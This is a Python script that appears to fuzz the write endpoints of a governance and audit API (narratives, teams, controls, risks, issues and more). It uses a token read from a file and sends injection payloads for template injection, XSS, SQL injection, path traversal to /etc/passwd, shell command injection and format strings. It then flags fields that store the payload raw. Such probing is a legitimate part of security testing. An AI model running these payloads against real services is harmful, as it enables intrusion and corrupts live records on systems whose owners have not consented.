import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def call(method,path,body=None,timeout=15):
    cmd=['curl','-s','-m',str(timeout),'-o','/tmp/hb','-w','%{http_code}|%{time_total}',
         '-X',method,H+path,'-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    r=subprocess.run(cmd,capture_output=True,text=True)
    out=r.stdout.strip()
    try: code,t=out.split('|')
    except: code,t=out or '000','0'
    try: txt=open('/tmp/hb',encoding='utf-8',errors='replace').read()
    except: txt=''
    return code,float(t or 0),txt
tag='ZX'+uuid.uuid4().hex[:6]
PAYS={
 'ssti':'{{7*7}}'+tag,
 'ssti2':'${7*7}'+tag,
 'ssti3':'<%= 7*7 %>'+tag,
 'xss':'"><svg onload=alert(1)>'+tag,
 'sqli':"'||(SELECT 1)||'"+tag,
 'path':'../../../../etc/passwd'+tag,
 'cmd':';id;'+tag,
 'fmt':'%s%s%s%n'+tag,
}
# write endpoints with a name/title-like field
TARGETS=[
 ('POST','/api/v1/narratives','narrative',{'name':'ZX','uid':f'zx-{tag}'}),
 ('POST','/api/v1/teams','team',{'name':'ZX'}),
 ('POST','/api/v1/controls','control',{'name':'ZX'}),
 ('POST','/api/v1/risks','risk',{'name':'ZX'}),
 ('POST','/api/v1/issues','issue',{'title':'ZX'}),
 ('POST','/api/v1/auditable_entities','auditable_entity',{'name':'ZX'}),
 ('POST','/api/v1/esg_metrics','esg_metric',{'name':'ZX'}),
 ('POST','/api/v1/exception_requests','exception_request',{'name':'ZX'}),
]
print(f"{'endpoint':40} {'field':10} {'result'}")
for m,path,key,base in TARGETS:
    for field in ['name','title','description']:
        if field not in base and field!='name': continue
        for pname,pay in PAYS.items():
            body={key:{**base, field:pay}}
            c,t,x=call(m,path,body)
            flag=''
            if c in ('200','201'):
                # read back and check for raw storage
                rid=None
                try:
                    d=json.loads(x); arr=d.get(key+'s') or d.get(key) or []
                    if arr: rid=arr[0].get('id')
                except: pass
                raw = pay in x
                flag=f'CREATED id={rid} raw_echo={raw}'
                if raw: flag+='  <<< RAW'
            elif c=='500': flag='500'
            elif c=='422':
                try: flag='422 '+json.loads(x)['errors'][0].get('detail','')[:50]
                except: flag='422'
            if c in ('200','201','500') or 'RAW' in flag:
                print(f"{m+' '+path:40} {field:10} {pname:6} {c} {flag[:110]}")
